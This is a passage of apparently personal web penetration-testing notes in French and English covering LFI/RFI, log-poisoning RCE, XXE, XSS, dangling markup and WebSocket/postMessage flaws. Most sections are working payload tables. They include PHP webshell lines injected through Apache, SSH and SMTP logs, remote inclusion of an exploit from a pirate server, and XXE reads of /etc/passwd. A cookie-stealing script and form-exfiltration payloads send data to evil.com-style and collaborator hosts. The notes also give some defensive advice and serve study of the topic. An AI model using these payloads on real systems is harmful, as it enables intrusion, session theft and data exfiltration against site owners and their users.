</ul>
</li>
</ul>
<p>
<strong>A SQL injection provides the same level of access as the user used by the application to connect to the database (current_user())... That is why it is always important to provide the lowest privileges possible to this user when you deploy a web application. </strong>
</p>
<ul>

<li>SQL Truncation : 
<ul>
 
<li>example : 
<p>

                    
<img src="images/image40.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

                    Ici, avec cette table dans l’application, on peut essayer recréer un autre compte admin en jouant sur la taille : “admin” + ” “ *7 + ”blabla”.
</p>
<p>

                    Ici ce pseudo sera tronqué à la création sur 12 octets ( sa taille MAX ) et donc sa valeur deviendra juste “admin”.
</p>
</li> 
</ul>
</li> 
</ul>
<p>
<strong>-------------------------------------------------------------------</strong>
</p>
<ul>

<li>Open Redirect
<p>

    <strong>Open Redirect vulnerabilities allows you to redirect the victim to a malicious website. They are low impact vulnerabilities in most cases unless you can use them to leak Oauth tokens.</strong>
</p>
<h4>
    Some payload</h4>



<table>
  <tr>
   <td>
<strong>//www.[URL…]</strong>
</li>
</ul>
   </td>
   <td><strong>If you have to begin le value by “/” ( because the developer chose that to only redirect to URL inside of the site ) you can just begin a URL with “//”</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>LFI/RFI :
</li>
</ul>
<h4>Some payloads</h4>



<table>
  <tr>
   <td><strong>?page= <a href="http://localhost/lfi.php?page=php://filter/read=convert.base64-encode/resource=lfi.php">php://filter/read=convert.base64-encode/resource=lfi.php</a></strong>
   </td>
   <td><strong>Affiche le contenu du fichier “lfi.php” encodé en Base64.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>?page= php://input</strong>
<p>
<strong>…..</strong>
<p>
<strong>&lt;?php system(“ ls -lA”) ?></strong>
   </td>
   <td><strong>Utilise le payload écrit dans les paramètres POST d’une requête.</strong>
   </td>
  </tr>
  <tr>
   <td>
<img src="images/image41.png" width="" alt="alt_text" title="image_tooltip">

   </td>
   <td><strong>Upload a Zip file with a PHP Shell inside and execute it.</strong>
<p>
<strong>phar:// fait à peu près la même chose</strong>
<p>
<strong>%23 = #</strong>
   </td>
  </tr>
  <tr>
   <td><strong>?page=expect://[COMMAND]</strong>
   </td>
   <td><strong>“Expect” has to be activated. You can execute code using this.</strong>
   </td>
  </tr>
  <tr>
   <td><strong><a href="http://localhost/rfi.php?page=data://text/plain;base64,RXhwbG9pdCBEYXRhVVJJIGluY2x1c2lvbg==">?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B</a></strong>
   </td>
   <td><strong>Dans cette exemple, la chaîne codée en base64 ( qui est un script php ) sera exécuté et l’affichage de résultat sera sur la page web</strong>
   </td>
  </tr>
  <tr>
   <td><strong><a href="http://localhost/rfi.php?page=http://serveur-pirate.net/exploit.php">?page=http://serveur-pirate.net/exploit.php</a></strong>
   </td>
   <td><strong>“exploit.php” sera exécuté. ( sans Wrapper PHP )</strong>
   </td>
  </tr>
  <tr>
   <td><strong><span style="text-decoration:underline;"> …. </span></strong>
<p>
<strong><span style="text-decoration:underline;">&lt;!ENTITY exploit SYSTEM "php://filter/read=convert.base64-decode/resource=<a href="http://site-piege/payload">http://site-piege/payload</a>"></span></strong>
<p>
<strong><span style="text-decoration:underline;">…..</span></strong>
   </td>
   <td><strong>XML External Entity Attack ( XXE ).</strong>
<p>
<strong>à bien placer dans le fichier XML en question.</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<h4>			RCE via Log poisoning</h4>


<p>
Step :
</p>
<ul>

<li>Envoyez du code PHP dans le fichier log :  
<ul>
 
<li>En accédant à l’url /&lt;?php system($_GET['cmd']);?> par exemple
</li> 
</ul>

<li>Inclure le fichier log via la RFI/LFI, ce qui va exécuter le code php
</li>
</ul>
<p>

<img src="images/image42.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h4>                       RCE via Proc Environ Injection</h4>


<ul>

<li>Ecrire du code php dans le User-Agent

<li>Inclure le fichier /proc/self/environ : This file hosts the initial environment of the Apache process. Thus, the environmental variable User-Agent is likely to appear there. Ce qui va exécuter le code php
</li>
</ul>
<p>

<img src="images/image43.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h4>RCE via SSH Log Poisoning</h4>


<ul>

<li>Try to connect to ssh on the target server : ssh '&lt;?php system($_GET['c']); ?>'@192.168.1.129

<li>The php code will be wrote in the log file ( /var/log/auth.log )
<p>

    
<img src="images/image44.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>payloads : 192.168.1.129/lfi/lfi.php?file=////var/log/auth.log&c=[RCE]
</li>
</ul>
</li>
</ul>
<h4>RCE via SMTP Log Poisoning</h4>


<ul>

<li>Try to connect to the SMTP (25) port : telnet 192.168.1.107 25

<li>Now let’s try to send a mail via the command line (CLI) of this machine and send the OS commands via the “RCPT TO” option : 
<p>

    
<img src="images/image45.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Final payload : 192.168.1.107/lfi/lfi.php?file=/var/log/mail.log&c=ifconfig
</li>
</ul>
</li>
</ul>
<ul>

<li>How to Detect

<li><strong>Détecter si une entrée utilisateur est vulnérable aux LFI/ RFI</strong>
<p>

        <strong>en PHP :</strong>
</p>
</li>
</ul>
<ul>

<li><strong>Via la configuration PHP : </strong>
<ul>

<li><strong>“allow_url_open” :</strong>
<p>

                <strong>Permet la récupération de ressources distantes si</strong>
</p>
<p>

                    <strong>sa valeur vaut “1” ou “On”.</strong>
</p>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>“allow_url_include” :</strong>
<p>

                <strong>Permet l’inclusion de ressources distantes ainsi</strong>
</p>
<p>

                <strong>que le support des wrappers PHP si sa valeur vaut</strong>
</p>
<p>

                <strong>“1” ou “On”.</strong>
</p>
<ul>

<li><strong>Via le code applicatif : </strong>
<p>

                <strong>Il suffit de regarder chaque occurrence d’appel aux fonctions suivantes :</strong>
</p>
<ul>

<li><strong><a href="http://php.net/manual/fr/function.include.php">include()</a></strong>

<li><strong><a href="http://php.net/manual/fr/function.require.php">require()</a></strong>

<li><strong><a href="http://php.net/manual/fr/function.include-once.php">include_once()</a></strong>

<li><strong><a href="http://php.net/manual/fr/function.require-once.php">require_once()</a></strong>
<p>

            <strong>Et vérifier si le paramètre passé à la fonction est</strong>
</p>
<p>

            <strong>directement ou indirectement une entrée utilisateur.</strong>
</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>

<li>XML external entity (XXE) injection 
<ul>
 
<li><strong>﻿XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>Exploiting XXE to retrieves files :</strong> 
<ul>
 
<li><strong>To perform this kind of injection, ﻿you need to modify the submitted XML in two ways:</strong>
<ul>

<li><strong>Introduce (or edit) a DOCTYPE element (DTD ) that defines an external entity containing the path to the file.</strong>

<li><strong>Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.</strong>
<p>

                        <strong>    </strong>
</p> 
<ul>
 
<li><strong>For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:</strong>
<p>

                    <strong>&lt;?xml version="1.0" encoding="UTF-8"?></strong>
</p>
<p>

                    <strong>&lt;stockCheck>&lt;productId>381&lt;/productId>&lt;/stockCheck></strong>
</p>
<p>

                    <strong>The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload:</strong>
</p>
<p>

                    <strong>&lt;?xml version="1.0" encoding="UTF-8"?></strong>
</p>
<p>

                    <strong>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"> ]></strong>
</p>
<p>

                    <strong>&lt;stockCheck>&lt;productId>&xxe;&lt;/productId>&lt;/stockCheck>         </strong>
</p> 
<ul>
 
<li><strong>Note : ﻿With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.</strong>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
<p>

<img src="images/image46.png" width="" alt="alt_text" title="image_tooltip">
<strong> </strong>
</p>
<p>


<img src="images/image47.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Scénario associée :</strong>
</p>
<p>

<img src="images/image48.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image49.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image50.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image51.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image52.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>XXE attacks via modified content type  :   </strong> 
<ul>
 
<li><strong>Most POST requests use a default content type that is generated by HTML forms, such as application/x-www-form-urlencoded. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.</strong>
<p>

                    <strong>For example, if a normal request contains the following:</strong>
</p>
<p>

                    <strong>POST /action HTTP/1.0</strong>
</p>
<p>

                    <strong>Content-Type: application/x-www-form-urlencoded</strong>
</p>
<p>

                    <strong>Content-Length: 7</strong>
</p>
<p>

                    <strong>foo=bar</strong>
</p>
<p>

                    <strong>Then you might be able submit the following request, with the same result:</strong>
</p>
<p>

                    <strong>POST /action HTTP/1.0</strong>
</p>
<p>

                    <strong>Content-Type: text/xml</strong>
</p>
<p>

                    <strong>Content-Length: 52</strong>
</p>
<p>

                    <strong>&lt;?xml version="1.0encoding="UTF-8"?>&lt;foo>bar&lt;/foo>         </strong>
</p>
<p>

                    <strong>and then you create your own payload.    </strong>
</p>
<ul>

<li><strong>Une DTD décrit la grammaire du document — liste des éléments (ou balises), des attributs, leur contenu et leur agencement — ainsi que le vocabulaire supplémentaire sous la forme d'une liste d'Entité de caractère.  </strong>
<p>

                <strong>The DTD is declared within the optional DOCTYPE element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD"( quand s’est écrit à l'intérieur du document )) or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.</strong>
</p>
<p>

                <strong> </strong>
</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>

<img src="images/image53.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>XML stands for "extensible markup language".This is a language designed for storing and transporting data.</strong>
<p>

                <strong>Its popularity has now declined in favor of the JSON format. </strong>
</p>
</li>
</ul>
<ul>

<li><strong>f</strong>
</li>
</ul>
<p>
<strong>Some interesting payload</strong>
</p>

<table>
  <tr>
   <td><strong>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]> </strong>
   </td>
   <td><strong>XXE to perform SSRF attacks</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"></strong>
<p>
<strong>&lt;xi:include parse="text" href="file:///etc/passwd"/>&lt;/foo> </strong>
   </td>
   <td><strong>Xinclude attack</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;?xml version="1.0" standalone="yes"?>&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">&lt;text font-size="16" x="0" y="16">&xxe;&lt;/text>&lt;/svg></strong>
   </td>
   <td><strong>XXE via image format SVG</strong>
<p>
<strong>&lt;- Donnée d’une image au format SVG. Ce format prend en compte du XML.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]> </strong>
   </td>
   <td><strong>Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD.</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>
<strong>Disabling the Document Type Definitions (DTDs) function will effectively prevent most attacks.</strong>
</p>
<p>
<strong>When possible, handling data using simpler formats like JSON is recommended. For almost a decade, JSON has been seen as preferable to the use of XML due to its lightweight syntax and newer construction.</strong>
</p>
<p>
<strong>When the entire XML document is transmitted from an untrusted client, it's not usually possible to selectively validate or escape tainted data within the system identifier in the DTD. Therefore, the XML processor should be configured to use a local static DTD and disallow any declared DTD included in the XML document.</strong>
</p>
<p>
<strong>If only simple XML data processing is required, use a native parser instead of a full-featured.</strong>
</p>
<ul>

<li>XSS ( Cross-site scripting ) :
</li>
</ul>
<ul>

<li>Definiton 
<ul>
 
<li><strong>Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application.</strong>
<p>

                <strong>It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other.</strong>
</p>
<ul>

<li><strong>Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>Reflected XSS is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. </strong>
</li>
</ul>
<ul>

<li><strong>Certains XSS peuvent s’effectuer avec des tags personnalisés.</strong>
</li>
</ul>
<h4>			  Interesting payload</h4>



<table>
  <tr>
   <td><strong>">&lt;script>alert(document.domain)&lt;/script></strong>
   </td>
   <td><strong>When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;..   " autofocus onfocus=alert(document.domain) x=" ..></strong>
   </td>
   <td><strong>More commonly, angle brackets are blocked or encoded.</strong>
<p>
<strong>Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;a href="javascript:alert(document.domain)" > </strong>
   </td>
   <td><strong>Il est possible d’injecter du script dans l’attribut <em>Href</em> (</strong> <strong>Sur des attributs en général ou une URL est attendue )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;/script>&lt;img src=1 onerror=alert(document.domain)></strong>
   </td>
   <td><strong>In context when you can close ﻿the script tag that is enclosing a existing Javascript.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>'-alert("hello")-’</strong>
<p>
<strong>';alert("hello")//</strong>
<p>
<strong>....</strong>
   </td>
   <td><strong>In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly.</strong>
<p>
<strong>It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.</strong>
<p>
<strong>Sur le premier payload , les opérateurs “-” permettent de séparer la fonction alert avec ce qui lui entoure (on peut utiliser n’importe quelle opération arithmétique à la place ).</strong>
<p>
<strong>Avant d'effectuer l'opération arithmétique , Alert(“hello”) sera évaluée donc exécutée</strong>
   </td>
  </tr>
  <tr>
   <td><strong>\\';alert(document.domain)//</strong>
   </td>
   <td><strong>Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash. A backslash before a character tells the JavaScript parser that the character should be interpreted literally.</strong>
<p>
<strong>In this situation, applications often make the mistake of failing to escape the backslash character itself.</strong>
<p>
<strong>This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;script>onerror=alert;throw 1&lt;/script></strong>
<p>
<strong>&lt;script>{onerror=alert}throw 1&lt;/script></strong>
   </td>
   <td><strong>This enables you to pass arguments to a function without using parentheses.</strong>
<p>
<strong>The following code assigns the alert() function to the global exception handler ( onerror ) and the throw statement passes the 1 to the exception handler (in this case alert).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;script>throw onerror=alert,'some string',123,'haha'&lt;/script></strong>
   </td>
   <td><strong>L'opérateur virgule en JS permet dans un certain contexte d'évaluer chacun de ses opérandes (de la gauche vers la droite) et de renvoyer la valeur du dernier opérande.</strong>
<p>
<strong>ici, c’est alert(‘haha’) qui s’affiche.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;script>{onerror=eval}throw'=alert\x281\x29'&lt;/script></strong>
   </td>
   <td><strong>Chrome prefixes the string sent to the exception handler with "Uncaught".</strong>
<p>
<strong>The string sent to eval is "Uncaught=alert(1337)". </strong>
<p>
<strong>This works fine on Chrome but on Firefox the exception gets prefixed with a two word string "uncaught exception" so it doesn’t work on it.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&apos;-alert(document.domain)-&apos; </strong>
   </td>
   <td><strong>When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters. </strong>
<p>
<strong>When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further</strong>
   </td>
  </tr>
  <tr>
   <td><strong>${alert(document.domain)} </strong>
   </td>
   <td><strong>When the XSS context is into a JavaScript template literal </strong>
<p>
<strong>( encapsulated in backticks instead of normal quotation marks ). you simply need to use the ${...} syntax to embed a JavaScript expression that will be executed when the literal is processed. And there is no need to terminate the literal.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;xss id=x onfocus=alert(document.cookie)</strong>
<p>
<strong> tabindex=1 >blabla &lt;/xss></strong>
   </td>
   <td><strong>Via des tags personnalisées</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;script></strong>
<p>
<strong>document.write('&lt;img src="[URL]?c='+document.cookie+'" />');</strong>
<p>
<strong>&lt;/script></strong>
   </td>
   <td><strong>Stealing Cookie with img</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li><strong>Si une page web possède un tag &lt;link> avec rel=”canonical”, une XSS réfléchie peut être effectuée en ajoutant des attributs à partir de l’attribut <em>href</em> car il contient l’url. </strong>
</li>
</ul>
<p>
<strong>				exemple:</strong>
</p>
<p>
<strong>				&lt;link rel="canonical" </strong>
</p>
<p>

            <strong>href='<a href="https://acac1f151e3f156a80ac0fe000e30095.we">https://acac1f151e3f156a80ac0fe000e30095.we</a></strong>
</p>
<p>

            <strong>b-security-academy.net/?'accesskey=’x’onclick=’alert’/></strong>
</p>
<p>

            <strong>Ce qu’il y a en rouge est le payload.</strong>
</p>
<ul>

<li><strong>Si le caractère “espace” est filtré, il peut être remplacé par “/**/”.</strong>
</li>
</ul>
<ul>

<li><strong>CSP (content security policy) permet d'améliorer la sécurité des sites web en permettant de détecter et réduire certains types d'attaques, dont les attaques XSS (Cross Site Scripting) et les injections de contenu. Ces attaques peuvent être utilisées dans divers buts, comme le vol de données, le défacement de site ou la diffusion de malware.</strong>
</li>
</ul>
<p>

        <strong>It works by restricting the resources (such as scripts and</strong>
</p>
<p>

        <strong>images) that a page can load and restricting whether a page </strong>
</p>
<p>

        <strong>can be framed by other pages.</strong>
</p>
<p>

        <strong>To enable CSP, a response needs to include an HTTP response header called Content-Security-Policy with a value containing </strong>
</p>
<p>

        <strong>the policy. The policy itself consists of one or more directives, </strong>
</p>
<p>

        <strong>separated by semicolons. </strong>
</p>
<p>

        <strong>X-XSS Protection Header :</strong>
</p>
<p>

        <strong>(Re)Active une protection contre les XSS présent dans les navigateurs modernes.</strong>
</p>
<p>
<strong>-------------------------------------------------------------------</strong>
</p>
<ul>

<li>Dangling markup injection :
<ul>

<li>Definiton
<p>

            <strong>Dangling markup is a technique to steal the contents of the page without script by using resources such as images to send the data to a remote location that an attacker controls. It is useful when reflected XSS doesn't work or is blocked by Content Security Policy (CSP).</strong>
</p>
<p>

            <strong>The idea is you inject some partial HTML that is in an unfinished state such as a src attribute of an image tag, and the rest of the markup on the page closes the attribute but also sends the data in-between to the remote server.</strong>
</p>
<p>

            <strong>Example :</strong>
</p>
<p>

            <strong>let's say we have an injection point above a script and a form like this:</strong>
</p>
</li>
</ul>
</li>
</ul>
<p>

<img src="images/image54.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

            <strong>Sometimes CSP will block the image vector with the open src attribute because the policy will not load any image resources or other sub resources. </strong>
</p>
<p>

            <strong>However we can use other tags like &lt;base> tag to bypass this restriction.</strong>
</p>
<p>

            <strong>By injecting an incomplete target attribute with &lt;base> tag the window name will be set with all the markup after the injection until the corresponding quote on every link on the page, therefore allowing us to steal tokens or whatever is between the injection point and the next quote.</strong>
</p>
<p>

<strong>	</strong>
<img src="images/image55.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>le Href dans la photo d’en haut contient l’URL de l’attaquant.</strong>
</li>
</ul>
<p>

<img src="images/image56.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image57.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image58.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h4>Interesting payloads</h4>



<table>
  <tr>
   <td><strong>&lt;form action='.....'>&lt;textarea> </strong>
   </td>
   <td><strong>la suite du code apparait dans un text area</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;meta http-equiv="refresh" content="4; URL='<a href="http://evil.com/log.cgi">http://evil.com/log.cgi</a>?</strong>
<p>
<strong>____________________________</strong>
<p>
<strong>&lt;meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=</strong>
<p>
<strong>____________________________</strong>
<p>
<strong>&lt;style>@import//hackvertor.co.uk?</strong>
<p>
<strong>( The CSS specification states that @import should continue parsing a url until it encounters a ending “;” )</strong>
<p>
<strong>____________________________</strong>
<p>
<strong>&lt;table background='//your-collaborator-id.burpcollaborator.net?'</strong>
<p>
<strong>____________________________</strong>
   </td>
   <td><strong>If img tag is forbidden, you can use these to include an URL ...</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;base href='http://evil.com/'></strong>
   </td>
   <td><strong>Then, the forms that send data to the path (like &lt;form action='update_profile.php'>) will send the data to the malicious domain.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;base target='</strong>
   </td>
   <td><strong>Include the data code in the variable windows.name (the user must click in some link, because the base tag will have changed the domain pointed by the link).</strong>
<p>
<strong>you can then check it with the navigator console.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;form action='http://evil.com/log_steal'></strong>
   </td>
   <td><strong>this will overwrite the next form header and all the data from the form will be sent to the attacker.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;button name=xss type=submit formaction='https://evil.com'>I get consumed!</strong>
   </td>
   <td><strong>The button can change the URL where the information of the form is going to be sent with the attribute "formaction"</strong>
   </td>
  </tr>
  <tr>
   <td><strong>&lt;meta name="language" HTTP-EQUIV="refresh" content='1;http://enzvnx9ibrjd.x.pipedream.net/?</strong>
   </td>
   <td><strong>Redirection automatique vers l’URL</strong>
   </td>
  </tr>
  <tr>
   <td><strong>[XSS]</strong>
<p>
<strong>&lt;script src=[URL]?q=a&callback=alert(1)'>&lt;/script></strong>
<p>
<strong>_____________________________</strong>
   </td>
   <td><strong>Any CSP-enabled website that either offers JSONP feeds to others, or utilizes them internally, is automatically prone to a flavor of return-oriented programming: the attacker is able to invoke any functions of his choice, often with at least partly controllable parameters, by specifying them as the callback parameter on the API call:</strong>
<p>

<img src="images/image59.png" width="" alt="alt_text" title="image_tooltip">

   </td>
  </tr>
  <tr>
   <td><strong>&lt;img id='is_public'></strong>
   </td>
   <td><strong>Create variables inside javascript namespace by inserting HTML tags. Then, this variable will affect the flow of the application ( if this id name is use after in the code )</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>
<strong>	List of HTML attribute with URL :</strong>
</p>
<p>
<strong>	</strong>
<img src="images/image60.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image61.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image62.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>DOM XSS :
<ul>

<li><strong>DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source ( client-side JavaScript ), such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML. </strong>
<p>

                <strong>This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts. </strong>
</p>
<ul>

<li><strong>﻿The most common source for DOM XSS is the URL, which is typically accessed with the window.location object.</strong>
<ul>

<li><strong>To test for DOM-based cross-site scripting manually, you generally need to use a browser with developer tools ( to see a close representation of the DOM ), such as Chrome. You need to work through each available source in turn, and test each one individually. </strong>
<ul>

<li><strong>To test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as location.search), then use developer tools to inspect the HTML and find where your string appears. </strong>
<ul>

<li><strong>For each location where your string appears within the DOM ( or Javascript file or script ), you need to identify the context ( if it passed into a sink or other ). Based on this context, you need to refine your input to see how it is processed. For example, if your string appears within a double-quoted attribute then try to inject double quotes in your string to see if you can break out of the attribute. </strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>

            <strong>        Some Sink for DOM XSS</strong>
</p>

<table>
  <tr>
   <td><strong>document.write</strong>
   </td>
   <td><strong>The document.write sink works with script elements, so you can use a simple payload, such as the one below:</strong>
<p>
<strong>document.write('... &lt;script>alert(document.domain)&lt;/script> ...'); </strong>
   </td>
  </tr>
  <tr>
   <td><strong>element.innerHTML</strong>
   </td>
   <td><strong>The innerHTML Sets or returns the content of an element. This sink doesn't accept script elements on any modern browser, nor will svg onload events fire.</strong>
<p>
<strong>This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements. For example:</strong>
<p>
<strong>element.innerHTML='... &lt;img src=1 onerror=alert(document.domain)> ...' </strong>
<p>
<strong>you can use innerText instead of innerHtml in basic &lt;span> stag.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>attr()</strong>
   </td>
   <td><strong>The attr() function in jQuery can change attributes on DOM elements. </strong>
   </td>
  </tr>
  <tr>
   <td><strong>ng-app attribute</strong>
   </td>
   <td><strong>If a framework like AngularJS is used, it may be possible to execute JavaScript without angle brackets or events:</strong>
<p>
<strong>When a site uses the ng-app attribute on an HTML element, it will be processed by AngularJS. </strong>
<p>
<strong>In this case, AngularJS can use Angular expressions inside double curly braces that can occur directly in HTML or inside attributes. </strong>
<p>
<strong>Angular expressions combined with a sandbox escape ( removed in Angular v 1.6 ),  we can execute arbitrary JavaScript and do some serious damage.</strong>
<p>
<strong>in versions 1.0 - 1.1.5 there was no sandbox.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>document.location.href</strong>
   </td>
   <td><strong>Il faut faire en sorte qu’il soit égal à  : javascript:alert(1)</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li><strong>You can use XSS inside SVG file  ( XSS by uploading file ):</strong>
<p>

    
<img src="images/image63.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

    <strong>Make sure that the content type is right.</strong>
</p>
</li>
</ul>
<ul>

<li>Cross-Site WebSocket Hijacking
<ul>

<li>Definition
<p>


<img src="images/image64.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>“101 Switching protocol means” that the web socket is connected.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>
<strong>	</strong>
</p>
<ul>

<li>Exploitation
</li>
</ul>
<p>
<strong>The problem is that Websocket can be made Cross-Site ( As opposed to XMLHttpRequest, WebSockets don't follow the same-origin policy) :</strong>
</p>
<p>

    
<img src="images/image65.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

    <strong>To deal with this attack, you have to check the Origin when dealing with WebSocket. </strong>
</p>
<ul>

<li><strong><span style="text-decoration:underline;">DOM XSS in web message :</span></strong>
</li>
</ul>
<p>
<strong><span style="text-decoration:underline;">Fonctionnement :</span></strong>
</p>
<p>


<img src="images/image66.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>What often happens is that le wildcard ”*” is used when sensitive messages are sent. So, any website can get this sensitive message :</strong>
</p>
<p>


<img src="images/image67.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Another scenario :</strong>
</p>
<p>


<img src="images/image68.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Here, there is no checking for the origin of the message. So an attacker can send any message to the website from another malicious one :</strong>
</p>
<p>
<strong>Another scenario :</strong>
</p>
<p>

<img src="images/image69.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Autre payload :</strong>
</p>
<p>

<img src="images/image70.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Il faut bien sûr que le site vulnérable permette les iframes pour ce type de payload.</strong>
</p>
<ul>

<li><strong>possible payload sans iframe :</strong>
</li>
</ul>
<p>

